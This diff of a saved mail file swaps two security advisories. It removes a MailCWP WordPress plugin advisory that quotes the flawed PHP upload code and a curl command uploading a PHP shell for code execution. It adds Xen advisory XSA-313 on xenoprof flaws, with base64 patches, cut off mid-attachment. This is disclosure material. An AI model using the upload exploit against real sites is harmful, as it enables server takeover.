@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1704" "Tuesday" "8" "November" "2016" "05:40:55" "-0500" "Larry W. Cashdollar" "larry0@me.com" "<56E1DCC7-3614-4AE7-AC63-1DF82CF64852@me.com>" "52" "[oss-security] Mailcwp remote file upload vulnerability incomplete fix v1.100" nil nil nil "11" "2016110810:40:55" "[oss-security] Mailcwp remote file upload vulnerability incomplete fix v1.100" (number mark "U       larry0@me.co Nov  8   52/1704  " thread-indent "\"[oss-security] Mailcwp remote file upload vulnerability incomplete fix v1.100\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["15276" "Tuesday" "14" "April" "2020" "12:00:42" "+0000" "Xen.org security team" "security@xen.org" "<E1jOKF8-00072Q-3i@xenbits.xenproject.org>" "316" "[oss-security] Xen Security Advisory 313 v3 (CVE-2020-11740,CVE-2020-11741) - multiple xenoprof issues" nil nil nil "4" "2020041412:00:42" "[oss-security] Xen Security Advisory 313 v3 (CVE-2020-11740,CVE-2020-11741) - multiple xenoprof issues" (number mark "U       security@xen Apr 14  316/15276 " thread-indent "\"[oss-security] Xen Security Advisory 313 v3 (CVE-2020-11740,CVE-2020-11741) - multiple xenoprof issues\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Xen Security Advisory 313 v3 (CVE-2020-11740,CVE-2020-11741) - multiple xenoprof issues" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 7880 invoked by uid 550); 8 Nov 2016 10:41:11 -0000
+Received: (qmail 26033 invoked by uid 550); 14 Apr 2020 12:01:02 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,81 +12,342 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 7862 invoked from network); 8 Nov 2016 10:41:10 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
-	t=1478601658; bh=EBEaIsXPaEBU/n9LgNB/nSRUCsXHESF8gEyxZuRdti0=;
-	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
-	b=GVmjaIdSUytc23zO7CqXi4SElUFes+jjAMHQaljkJnpz0Gnu4t63Os2DvnSJmb/7e
- chRFqSeeDSnLwAzhpcWRQG4UmBs+WnVWpjD7gTU+mslG989hMhH/1YcLUGWuN6v1nA
- F+t8ndXZxCiavpQeDEkkzzXntCqvqmjCJhUoYhYPS8AgnNNgSfxfkIm/5OV+VvHPhs
- fJ+eW3Zvp5UtJIRelcU677vWoYDqLy26j3MZy7psi+Br1SBnDQtGNr8bjFhIV3hthL
- xUfzTG/c8i3XTEIAUoVYJkDRZF1s2qMKMZEj2PCa5uA6ThCkzvDTUolfB/Jemtb9G3
- 6LuNbNE4voySw==
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
- definitions=2016-11-08_03:,, signatures=0
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
- clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
- bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.0.1-1603290000 definitions=main-1611080197
-From: "Larry W. Cashdollar" <larry0@me.com>
-Content-type: text/plain; charset=utf-8
-Content-transfer-encoding: quoted-printable
-Message-id: <56E1DCC7-3614-4AE7-AC63-1DF82CF64852@me.com>
-Date: Tue, 08 Nov 2016 05:40:55 -0500
-To: Open Source Security <oss-security@lists.openwall.com>
-MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
-X-Mailer: Apple Mail (2.3124)
-Subject: [oss-security] Mailcwp remote file upload vulnerability incomplete fix v1.100
+Received: (qmail 26013 invoked from network); 14 Apr 2020 12:01:01 -0000
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=xen.org;
+	s=20200302mail; h=Date:Message-Id:Subject:CC:From:To:MIME-Version:
+	Content-Transfer-Encoding:Content-Type:Sender:Reply-To:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=eucW+RPaT0GEI8HFOjDiEnXO1niYC5IiWEbkmd5hCwo=; b=wd+55sFB06fPR6QnSYvEDjApz+
+	h05YF9ODQI1QrQkCzcuuYJ4rkxB3X0ogYiS0KU8821+I6oERensZlARt66Ybe+vbq1OlNJFyRyMn8
+	AblUNWcESKqLJIZyFlC2SCbys9DDdWQolc4AQ2bbBdQtSdPoDBZufHknXkFVMCFkMNDc=;
+Content-Type: multipart/mixed; boundary="=separator"; charset="utf-8"
+Content-Transfer-Encoding: binary
+MIME-Version: 1.0
+X-Mailer: MIME-tools 5.508 (Entity 5.508)
+To: xen-announce@lists.xen.org, xen-devel@lists.xen.org,
+ xen-users@lists.xen.org, oss-security@lists.openwall.com
+From: Xen.org security team <security@xen.org>
+CC: Xen.org security team <security-team-members@xen.org>
+Message-Id: <E1jOKF8-00072Q-3i@xenbits.xenproject.org>
+Date: Tue, 14 Apr 2020 12:00:42 +0000
+Subject: [oss-security] Xen Security Advisory 313 v3 (CVE-2020-11740,CVE-2020-11741) -
+ multiple xenoprof issues
 
-Title: Mailcwp remote file upload vulnerability incomplete fix v1.100
-Author: Larry W. Cashdollar, @_larry0
-Date: 2016-11-01
-Download Site: https://wordpress.org/plugins/mailcwp/
-Vendor: CadreWorks Pty Ltd
-Vendor Notified: 2016-11-01
-Vendor Contact: plugins@wordpress.org
-Description: MailCWP, Mail Client for WordPress. A full-featured mail clien=
-t plugin providing webmail access through your WordPress blog or website.
-Vulnerability:
-I noticed CVE-2015-1000000 wasn't fixed correctly, _any_ authenticated user=
- can upload a file to the WordPress installation, they can get .php code ex=
-ecution by changing the extension to .php[3-5], .pht or .phtml.
+--=separator
+Content-Type: text/plain; charset="utf-8"
+Content-Disposition: inline
+Content-Transfer-Encoding: 7bit
 
-My previous advisory:
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-http://www.vapidlabs.com/advisory.php?v=3D138
+    Xen Security Advisory CVE-2020-11740,CVE-2020-11741 / XSA-313
+                              version 3
 
+                       multiple xenoprof issues
 
-require_once "../../../wp-load.php";
+UPDATES IN VERSION 3
+====================
 
-if (!is_user_logged_in()) {
-  die('{"ERROR": -1}');
-}
+Public release.
 
-$message_id =3D $_REQUEST["message_id"];
-$upload_dir =3D $_REQUEST["upload_dir"];
-if (empty($_FILES) || $_FILES["file"]["error"]) {
-  die('{"OK": 0}');
-}
-=20
-$fileName =3D $_FILES["file"]["name"];
-$ext =3D pathinfo($fileName, PATHINFO_EXTENSION);
-if ($ext =3D=3D 'php') {
-  die('{"ERROR": -2}');
-}
-move_uploaded_file($_FILES["file"]["tmp_name"], "$upload_dir/$message_id-$f=
-ileName");
-=20
-die('{"OK": 1}');
+ISSUE DESCRIPTION
+=================
 
-CVE-2016-1000156
-Exploit Code:
-	=E2=80=A2 Create any type of user and copy the contents of your cookie fil=
-e for curl:
-	=E2=80=A2=20=20
-	=E2=80=A2 $ curl   -F "file=3D@/home/larry/shell.php5" "http://example.com=
-/wp-content/plugins/mailcwp/mailcwp-upload.php?message_id=3D1" -F "upload_d=
-ir=3D/usr/share/wordpress/wp-content/uploads" --cookie cookie.txt=20
-	=E2=80=A2 {"OK": 1}
-Advisory: www.vapidlabs.com/advisory.php?v=3D175
-Notes: Incomplete fix for CVE-2015-1000000=
+Unprivileged guests can request to map xenoprof buffers, even if
+profiling has not been enabled for those guests.  These buffers were
+not scrubbed.  This is CVE-2020-11740.
+
+Furthermore, for guests for which "active" profiling was enabled by
+the administrator, the xenoprof code uses the standard Xen shared ring
+structure.  Unfortunately, this code did not treat the guest as a
+potential adversary: it trusts the guest not to modify buffer size
+information or modify head / tail pointers in unexpected ways.  This is
+CVE-2020-11741.
+
+IMPACT
+======
+
+A malicious guest may be able to access sensitive information
+pertaining to other guests.  Guests with "active profiling" enabled
+can crash the host (DoS).  Privilege escalation cannot be ruled out.
+
+VULNERABLE SYSTEMS
+==================
+
+Only x86 PV guests can leverage the vulnerabilities.  Arm guests and
+x86 HVM and PVH guests cannot leverage the vulnerabilities.
+
+All Xen versions back to at least 3.2 are vulnerable.
+
+Any x86 PV guest can leverage the information leak.  Only x86 PV guests
+whose host administrator has explicitly enabled "active profiling" for an
+untrusted guest can exploit the DoS / potential privilege escalation.
+
+Only builds of Xen with the Xenoprof functionality enabled at build
+time are vulnerable.  The option to disable the functionality at build
+time was been introduced in Xen 4.7.
+
+MITIGATION
+==========
+
+Never making any untrusted guests "active" will avoid all but the info
+leak part of the vulnerabilities.  There's no known mitigation for the
+information leak (lack of scrubbing).
+
+CREDITS
+=======
+
+This issue was discovered by Ilja Van Sprundel of IOActive.
+
+RESOLUTION
+==========
+
+Applying the attached set of patches resolves these issues.
+
+The first patch fixes the information leak issue, and should be
+applied to all x86 systems running untrusted PV guests.
+
+The second patch fixes the "active profiling" issue.  Systems which do
+not enable active profiling can safely skip patch 2.
+
+Note that patches for released versions are generally prepared to
+apply to the stable branches, and may not apply cleanly to the most
+recent release tarball.  Downstreams are encouraged to update to the
+tip of the stable branch before applying these patches.
+
+xsa313-?.patch         xen-unstable, Xen 4.9.x - 4.13.x
+
+$ sha256sum xsa313*
+63a11c5470a6c24f19d3a8a45042306256e7422d6556e3d76badaa515deb76d6  xsa313.meta
+f186ad88b492b730aeae3bd01083dd6c13813ce08bcd4ffc608d7af500633a62  xsa313-1.patch
+9fbcb5f11e5029e7d371ddb3520443c2780f240edc3d24436872935e34a85c37  xsa313-2.patch
+$
+
+DEPLOYMENT DURING EMBARGO
+=========================
+
+Deployment of the patches and/or mitigations described above (or
+others which are substantially similar) is permitted during the
+embargo, even on public-facing systems with untrusted guest users and
+administrators.
+
+But: Distribution of updated software is prohibited (except to other
+members of the predisclosure list).
+
+Predisclosure list members who wish to deploy significantly different
+patches and/or mitigations, please contact the Xen Project Security
+Team.
+
+(Note: this during-embargo deployment notice is retained in
+post-embargo publicly released Xen Project advisories, even though it
+is then no longer applicable.  This is to enable the community to have
+oversight of the Xen Project Security Team's decisionmaking.)
+
+For more information about permissible uses of embargoed information,
+consult the Xen Project community's agreed Security Policy:
+  http://www.xenproject.org/security-policy.html
+-----BEGIN PGP SIGNATURE-----
+
+iQFABAEBCAAqFiEEI+MiLBRfRHX6gGCng/4UyVfoK9kFAl6VpdkMHHBncEB4ZW4u
+b3JnAAoJEIP+FMlX6CvZYZcH/0UHo2zmXGMDvZn1EF20ccKXNoZjvAE5TxSr/A/M
+qkeASj4IMKlrPOrvs7aQSp97vECTz71Fxz2z7wpGwgIdiOYcRVg/t3b/+E1QSx5N
+T7xYxxD9ULOLBQyPjYnXYwDC9+9yy+PZuWt3oPeXHrdtLI/5VY/gCzU+k+7bDABh
+uljJ5KqxeQ5W8DOCR+XscQSZ9wiSkyh8MANjuJJ7uhtVDBo+ul94lrInJYEaBVpI
+At5cU53B5nVGQ3RkNyWKjSW3VbL1TLgTdWAJNQOo+Z0OZJiKm6xQ6OYph2L4C4j4
+e5A5c8UZAXLxVFWIMuiRW2GekOQEkGXtu+uJP00GuXm3+cQ=
+=1C0J
+-----END PGP SIGNATURE-----
+
+--=separator
+Content-Type: application/octet-stream; name="xsa313.meta"
+Content-Disposition: attachment; filename="xsa313.meta"
+Content-Transfer-Encoding: base64
+
+ewogICJYU0EiOiAzMTMsCiAgIlN1cHBvcnRlZFZlcnNpb25zIjogWwogICAg
+Im1hc3RlciIsCiAgICAiNC4xMyIsCiAgICAiNC4xMiIsCiAgICAiNC4xMSIs
+CiAgICAiNC4xMCIsCiAgICAiNC45IgogIF0sCiAgIlRyZWVzIjogWwogICAg
+InhlbiIKICBdLAogICJSZWNpcGVzIjogewogICAgIjQuMTAiOiB7CiAgICAg
+ICJSZWNpcGVzIjogewogICAgICAgICJ4ZW4iOiB7CiAgICAgICAgICAiU3Rh
+YmxlUmVmIjogIjQ5YTVkNmU5MjMxN2E3ZDlhY2JmMGJkYmQyNWIyODA5ZGZk
+ODQyNjAiLAogICAgICAgICAgIlByZXJlcXMiOiBbXSwKICAgICAgICAgICJQ
+YXRjaGVzIjogWwogICAgICAgICAgICAieHNhMzEzLT8ucGF0Y2giCiAgICAg
+ICAgICBdCiAgICAgICAgfQogICAgICB9CiAgICB9LAogICAgIjQuMTEiOiB7
+CiAgICAgICJSZWNpcGVzIjogewogICAgICAgICJ4ZW4iOiB7CiAgICAgICAg
+ICAiU3RhYmxlUmVmIjogIjZiYzU0YzA2OTZjMGY2ZjYzOTU5ODM2M2QyODRj
+NzE4OGE5ZTIwYWUiLAogICAgICAgICAgIlByZXJlcXMiOiBbXSwKICAgICAg
+ICAgICJQYXRjaGVzIjogWwogICAgICAgICAgICAieHNhMzEzLT8ucGF0Y2gi
+CiAgICAgICAgICBdCiAgICAgICAgfQogICAgICB9CiAgICB9LAogICAgIjQu
+MTIiOiB7CiAgICAgICJSZWNpcGVzIjogewogICAgICAgICJ4ZW4iOiB7CiAg
+ICAgICAgICAiU3RhYmxlUmVmIjogIjgyNGJkYjQzMmZjODgzMWVlNDY4NGU0
+NTM2MWE3OGZhZWU0NTQ4ZWQiLAogICAgICAgICAgIlByZXJlcXMiOiBbXSwK
+ICAgICAgICAgICJQYXRjaGVzIjogWwogICAgICAgICAgICAieHNhMzEzLT8u
+cGF0Y2giCiAgICAgICAgICBdCiAgICAgICAgfQogICAgICB9CiAgICB9LAog
+ICAgIjQuMTMiOiB7CiAgICAgICJSZWNpcGVzIjogewogICAgICAgICJ4ZW4i
+OiB7CiAgICAgICAgICAiU3RhYmxlUmVmIjogImQzZjNlNDQ3Njc2NjY3ZWYz
+MGI0ODcwOGQzNTljOGY4YjEzYTlhMDMiLAogICAgICAgICAgIlByZXJlcXMi
+OiBbXSwKICAgICAgICAgICJQYXRjaGVzIjogWwogICAgICAgICAgICAieHNh
+MzEzLT8ucGF0Y2giCiAgICAgICAgICBdCiAgICAgICAgfQogICAgICB9CiAg
+ICB9LAogICAgIjQuOSI6IHsKICAgICAgIlJlY2lwZXMiOiB7CiAgICAgICAg
+InhlbiI6IHsKICAgICAgICAgICJTdGFibGVSZWYiOiAiY2YyZTljYzBiYTA0
+MzJmMDVjZGNhMzZkY2Q0NmJlNWZkZmQ3Y2EwYyIsCiAgICAgICAgICAiUHJl
+cmVxcyI6IFtdLAogICAgICAgICAgIlBhdGNoZXMiOiBbCiAgICAgICAgICAg
+ICJ4c2EzMTMtPy5wYXRjaCIKICAgICAgICAgIF0KICAgICAgICB9CiAgICAg
+IH0KICAgIH0sCiAgICAibWFzdGVyIjogewogICAgICAiUmVjaXBlcyI6IHsK
+ICAgICAgICAieGVuIjogewogICAgICAgICAgIlN0YWJsZVJlZiI6ICJlMTli
+NGIzYjU1Zjg0ZTBjZmNjMDJmZTVkNjY5NjU5NjlhODFjOTY1IiwKICAgICAg
+ICAgICJQcmVyZXFzIjogW10sCiAgICAgICAgICAiUGF0Y2hlcyI6IFsKICAg
+ICAgICAgICAgInhzYTMxMy0/LnBhdGNoIgogICAgICAgICAgXQogICAgICAg
+IH0KICAgICAgfQogICAgfQogIH0KfQ==
+
+--=separator
+Content-Type: application/octet-stream; name="xsa313-1.patch"
+Content-Disposition: attachment; filename="xsa313-1.patch"
+Content-Transfer-Encoding: base64
+
+RnJvbTogSmFuIEJldWxpY2ggPGpiZXVsaWNoQHN1c2UuY29tPgpTdWJqZWN0
+OiB4ZW5vcHJvZjogY2xlYXIgYnVmZmVyIGludGVuZGVkIHRvIGJlIHNoYXJl
+ZCB3aXRoIGd1ZXN0cwoKYWxsb2NfeGVuaGVhcF9wYWdlcygpIG1ha2luZyB1
+c2Ugb2YgTUVNRl9ub19zY3J1YiBpcyBmaW5lIGZvciBYZW4KaW50ZXJuYWxs
+eSB1c2VkIGFsbG9jYXRpb25zLCBidXQgYnVmZmVycyBhbGxvY2F0ZWQgdG8g
+YmUgc2hhcmVkIHdpdGgKKHVucHJpdmlsaWdlZCkgZ3Vlc3RzIG5lZWQgdG8g
+YmUgemFwcGVkIG9mIHRoZWlyIHByaW9yIGNvbnRlbnQuCgpUaGlzIGlzIHBh
+cnQgb2YgWFNBLTMxMy4KClJlcG9ydGVkLWJ5OiBJbGphIFZhbiBTcHJ1bmRl
+bCA8aXZhbnNwcnVuZGVsQGlvYWN0aXZlLmNvbT4KU2lnbmVkLW9mZi1ieTog
+SmFuIEJldWxpY2ggPGpiZXVsaWNoQHN1c2UuY29tPgpSZXZpZXdlZC1ieTog
+QW5kcmV3IENvb3BlciA8YW5kcmV3LmNvb3BlcjNAY2l0cml4LmNvbT4KUmV2
+aWV3ZWQtYnk6IFdlaSBMaXUgPHdsQHhlbi5vcmc+CgotLS0gYS94ZW4vY29t
+bW9uL3hlbm9wcm9mLmMKKysrIGIveGVuL2NvbW1vbi94ZW5vcHJvZi5jCkBA
+IC0yNTMsNiArMjUzLDkgQEAgc3RhdGljIGludCBhbGxvY194ZW5vcHJvZl9z
+dHJ1Y3QoCiAgICAgICAgIHJldHVybiAtRU5PTUVNOwogICAgIH0KIAorICAg
+IGZvciAoIGkgPSAwOyBpIDwgbnBhZ2VzOyArK2kgKQorICAgICAgICBjbGVh
+cl9wYWdlKGQtPnhlbm9wcm9mLT5yYXdidWYgKyBpICogUEFHRV9TSVpFKTsK
+KwogICAgIGQtPnhlbm9wcm9mLT5ucGFnZXMgPSBucGFnZXM7CiAgICAgZC0+
+eGVub3Byb2YtPm5idWYgPSBudmNwdTsKICAgICBkLT54ZW5vcHJvZi0+YnVm
+c2l6ZSA9IGJ1ZnNpemU7Cg==
+
+--=separator
+Content-Type: application/octet-stream; name="xsa313-2.patch"
+Content-Disposition: attachment; filename="xsa313-2.patch"
+Content-Transfer-Encoding: base64
+
+RnJvbTogSmFuIEJldWxpY2ggPGpiZXVsaWNoQHN1c2UuY29tPgpTdWJqZWN0
+OiB4ZW5vcHJvZjogbGltaXQgY29uc3VtcHRpb24gb2Ygc2hhcmVkIGJ1ZmZl
+ciBkYXRhCgpTaW5jZSBhIHNoYXJlZCBidWZmZXIgY2FuIGJlIHdyaXR0ZW4g
+dG8gYnkgdGhlIGd1ZXN0LCB3ZSBtYXkgb25seSByZWFkCnRoZSBoZWFkIGFu
+ZCB0YWlsIHBvaW50ZXJzIGZyb20gdGhlcmUgKGFsbCBvdGhlciBmaWVsZHMg
+c2hvdWxkIG9ubHkgZXZlcgpiZSB3cml0dGVuIHRvKS4gRnVydGhlcm1vcmUs
+IGZvciBhbnkgcGFydGljdWxhciBvcGVyYXRpb24gdGhlIHR3byB2YWx1ZXMK
+bXVzdCBiZSByZWFkIGV4YWN0bHkgb25jZSwgd2l0aCBib3RoIGNoZWNrcyBh
+bmQgY29uc3VtcHRpb24gaGFwcGVuaW5nCndpdGggdGhlIHRodXMgcmVhZCB2
+YWx1ZXMuIChUaGUgYmFja3RyYWNlIHJlbGF0ZWQgeGVub3Byb2ZfYnVmX3Nw
+YWNlKCkKdXNlIGluIHhlbm9wcm9mX2xvZ19ldmVudCgpIGlzIGFuIGV4Y2Vw
+dGlvbjogVGhlIHZhbHVlcyB1c2VkIHRoZXJlIGdldApyZS1jaGVja2VkIGJ5
+IGV2ZXJ5IHN1YnNlcXVlbnQgeGVub3Byb2ZfYWRkX3NhbXBsZSgpLikKClNp
+bmNlIHRoYXQgY29kZSBuZWVkZWQgdG91Y2hpbmcsIGFsc28gZml4IHRoZSBk
+b3VibGUgaW5jcmVtZW50IG9mIHRoZQpsb3N0IHNhbXBsZXMgY291bnQgaW4g
+Y2FzZSB0aGUgYmFja3RyYWNlIHJlbGF0ZWQgeGVub3Byb2ZfYWRkX3NhbXBs
+ZSgpCmludm9jYXRpb24gaW4geGVub3Byb2ZfbG9nX2V2ZW50KCkgZmFpbHMu
+CgpXaGVyZSBjb2RlIGlzIGJlaW5nIHRvdWNoZWQgYW55d2F5LCBhZGQgY29u
+c3QgYXMgYXBwcm9wcmlhdGUsIGJ1dCB0YWtlCnRoZSBvcHBvcnR1bml0eSB0
+byBlbnRpcmVseSBkcm9wIHRoZSBub3cgdW51c2VkIGRvbWFpbiBwYXJhbWV0
+ZXIgb2YKeGVub3Byb2ZfYnVmX3NwYWNlKCkuCgpUaGlzIGlzIHBhcnQgb2Yg
+WFNBLTMxMy4KClJlcG9ydGVkLWJ5OiBJbGphIFZhbiBTcHJ1bmRlbCA8aXZh
+bnNwcnVuZGVsQGlvYWN0aXZlLmNvbT4KU2lnbmVkLW9mZi1ieTogSmFuIEJl
+dWxpY2ggPGpiZXVsaWNoQHN1c2UuY29tPgpSZXZpZXdlZC1ieTogR2Vvcmdl
+IER1bmxhcCA8Z2VvcmdlLmR1bmxhcEBjaXRyaXguY29tPgpSZXZpZXdlZC1i
+eTogV2VpIExpdSA8d2xAeGVuLm9yZz4KCi0tLSBhL3hlbi9jb21tb24veGVu
+b3Byb2YuYworKysgYi94ZW4vY29tbW9uL3hlbm9wcm9mLmMKQEAgLTQ3OSwy
+NSArNDc5LDIyIEBAIHN0YXRpYyBpbnQgYWRkX3Bhc3NpdmVfbGlzdChYRU5f
+R1VFU1RfSEEKIAogCiAvKiBHZXQgc3BhY2UgaW4gdGhlIGJ1ZmZlciAqLwot
+c3RhdGljIGludCB4ZW5vcHJvZl9idWZfc3BhY2Uoc3RydWN0IGRvbWFpbiAq
+ZCwgeGVub3Byb2ZfYnVmX3QgKiBidWYsIGludCBzaXplKQorc3RhdGljIGlu
+dCB4ZW5vcHJvZl9idWZfc3BhY2UoaW50IGhlYWQsIGludCB0YWlsLCBpbnQg
+c2l6ZSkKIHsKLSAgICBpbnQgaGVhZCwgdGFpbDsKLQotICAgIGhlYWQgPSB4
+ZW5vcHJvZl9idWYoZCwgYnVmLCBldmVudF9oZWFkKTsKLSAgICB0YWlsID0g
+eGVub3Byb2ZfYnVmKGQsIGJ1ZiwgZXZlbnRfdGFpbCk7Ci0KICAgICByZXR1
+cm4gKCh0YWlsID4gaGVhZCkgPyAwIDogc2l6ZSkgKyB0YWlsIC0gaGVhZCAt
+IDE7CiB9CiAKIC8qIENoZWNrIGZvciBzcGFjZSBhbmQgYWRkIGEgc2FtcGxl
+LiBSZXR1cm4gMSBpZiBzdWNjZXNzZnVsLCAwIG90aGVyd2lzZS4gKi8KLXN0
+YXRpYyBpbnQgeGVub3Byb2ZfYWRkX3NhbXBsZShzdHJ1Y3QgZG9tYWluICpk
+LCB4ZW5vcHJvZl9idWZfdCAqYnVmLAorc3RhdGljIGludCB4ZW5vcHJvZl9h
+ZGRfc2FtcGxlKGNvbnN0IHN0cnVjdCBkb21haW4gKmQsCisgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgY29uc3Qgc3RydWN0IHhlbm9wcm9mX3Zj
+cHUgKnYsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdWludDY0
+X3QgZWlwLCBpbnQgbW9kZSwgaW50IGV2ZW50KQogeworICAgIHhlbm9wcm9m
+X2J1Zl90ICpidWYgPSB2LT5idWZmZXI7CiAgICAgaW50IGhlYWQsIHRhaWws
+IHNpemU7CiAKICAgICBoZWFkID0geGVub3Byb2ZfYnVmKGQsIGJ1ZiwgZXZl
+bnRfaGVhZCk7CiAgICAgdGFpbCA9IHhlbm9wcm9mX2J1ZihkLCBidWYsIGV2
+ZW50X3RhaWwpOwotICAgIHNpemUgPSB4ZW5vcHJvZl9idWYoZCwgYnVmLCBl
+dmVudF9zaXplKTsKKyAgICBzaXplID0gdi0+ZXZlbnRfc2l6ZTsKICAgICAK
+ICAgICAvKiBtYWtlIHN1cmUgaW5kZXhlcyBpbiBzaGFyZWQgYnVmZmVyIGFy
+ZSBzYW5lICovCiAgICAgaWYgKCAoaGVhZCA8IDApIHx8IChoZWFkID49IHNp
+emUpIHx8ICh0YWlsIDwgMCkgfHwgKHRhaWwgPj0gc2l6ZSkgKQpAQCAtNTA2
+LDcgKzUwMyw3IEBAIHN0YXRpYyBpbnQgeGVub3Byb2ZfYWRkX3NhbXBsZShz
+dHJ1Y3QgZG8KICAgICAgICAgcmV0dXJuIDA7CiAgICAgfQogCi0gICAgaWYg
+KCB4ZW5vcHJvZl9idWZfc3BhY2UoZCwgYnVmLCBzaXplKSA+IDAgKQorICAg
+IGlmICggeGVub3Byb2ZfYnVmX3NwYWNlKGhlYWQsIHRhaWwsIHNpemUpID4g
+MCApCiAgICAgewogICAgICAgICB4ZW5vcHJvZl9idWYoZCwgYnVmLCBldmVu
+dF9sb2dbaGVhZF0uZWlwKSA9IGVpcDsKICAgICAgICAgeGVub3Byb2ZfYnVm
+KGQsIGJ1ZiwgZXZlbnRfbG9nW2hlYWRdLm1vZGUpID0gbW9kZTsKQEAgLTUz
+MCw3ICs1MjcsNiBAQCBzdGF0aWMgaW50IHhlbm9wcm9mX2FkZF9zYW1wbGUo
+c3RydWN0IGRvCiBpbnQgeGVub3Byb2ZfYWRkX3RyYWNlKHN0cnVjdCB2Y3B1
+ICp2Y3B1LCB1aW50NjRfdCBwYywgaW50IG1vZGUpCiB7CiAgICAgc3RydWN0
+IGRvbWFpbiAqZCA9IHZjcHUtPmRvbWFpbjsKLSAgICB4ZW5vcHJvZl9idWZf
+dCAqYnVmID0gZC0+eGVub3Byb2YtPnZjcHVbdmNwdS0+dmNwdV9pZF0uYnVm
+ZmVyOwogCiAgICAgLyogRG8gbm90IGFjY2lkZW50YWxseSB3cml0ZSBhbiBl
+c2NhcGUgY29kZSBkdWUgdG8gYSBicm9rZW4gZnJhbWUuICovCiAgICAgaWYg
+KCBwYyA9PSBYRU5PUFJPRl9FU0NBUEVfQ09ERSApCkBAIC01MzksNyArNTM1
+LDggQEAgaW50IHhlbm9wcm9mX2FkZF90cmFjZShzdHJ1Y3QgdmNwdSAqdmNw
+dQogICAgICAgICByZXR1cm4gMDsKICAgICB9CiAKLSAgICByZXR1cm4geGVu
+b3Byb2ZfYWRkX3NhbXBsZShkLCBidWYsIHBjLCBtb2RlLCAwKTsKKyAgICBy
+ZXR1cm4geGVub3Byb2ZfYWRkX3NhbXBsZShkLCAmZC0+eGVub3Byb2YtPnZj
+cHVbdmNwdS0+dmNwdV9pZF0sCisgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgcGMsIG1vZGUsIDApOwogfQogCiB2b2lkIHhlbm9wcm9mX2xvZ19l
+dmVudChzdHJ1Y3QgdmNwdSAqdmNwdSwgY29uc3Qgc3RydWN0IGNwdV91c2Vy
+X3JlZ3MgKnJlZ3MsCkBAIC01NzAsMTcgKzU2NywyMiBAQCB2b2lkIHhlbm9w
+cm9mX2xvZ19ldmVudChzdHJ1Y3QgdmNwdSAqdmNwCiAgICAgLyogUHJvdmlk
+ZSBiYWNrdHJhY2UgaWYgcmVxdWVzdGVkLiAqLwogICAgIGlmICggYmFja3Ry
+YWNlX2RlcHRoID4gMCApCiAgICAgewotICAgICAgICBpZiAoICh4ZW5vcHJv
+Zl9idWZfc3BhY2UoZCwgYnVmLCB2LT5ldmVudF9zaXplKSA8IDIpIHx8Ci0g
+ICAgICAgICAgICAgIXhlbm9wcm9mX2FkZF9zYW1wbGUoZCwgYnVmLCBYRU5P
+UFJPRl9FU0NBUEVfQ09ERSwgbW9kZSwgCi0gICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgWEVOT1BST0ZfVFJBQ0VfQkVHSU4pICkKKyAgICAg
+ICAgaWYgKCB4ZW5vcHJvZl9idWZfc3BhY2UoeGVub3Byb2ZfYnVmKGQsIGJ1
+ZiwgZXZlbnRfaGVhZCksCisgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgIHhlbm9wcm9mX2J1ZihkLCBidWYsIGV2ZW50X3RhaWwpLAorICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICB2LT5ldmVudF9zaXplKSA8IDIg
+KQogICAgICAgICB7CiAgICAgICAgICAgICB4ZW5vcHJvZl9idWYoZCwgYnVm
+LCBsb3N0X3NhbXBsZXMpKys7CiAgICAgICAgICAgICBsb3N0X3NhbXBsZXMr
+KzsKICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgfQorCisgICAgICAg
+IC8qIHhlbm9wcm9mX2FkZF9zYW1wbGUoKSB3aWxsIGluY3JlbWVudCBsb3N0
+X3NhbXBsZXMgb24gZmFpbHVyZSAqLworICAgICAgICBpZiAoICF4ZW5vcHJv
+Zl9hZGRfc2FtcGxlKGQsIHYsIFhFTk9QUk9GX0VTQ0FQRV9DT0RFLCBtb2Rl
+LAorICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFhFTk9QUk9G
+X1RSQUNFX0JFR0lOKSApCisgICAgICAgICAgICByZXR1cm47CiAgICAgfQog
+Ci0gICAgaWYgKCB4ZW5vcHJvZl9hZGRfc2FtcGxlKGQsIGJ1ZiwgcGMsIG1v
+ZGUsIGV2ZW50KSApCisgICAgaWYgKCB4ZW5vcHJvZl9hZGRfc2FtcGxlKGQs
+IHYsIHBjLCBtb2RlLCBldmVudCkgKQogICAgIHsKICAgICAgICAgaWYgKCBp
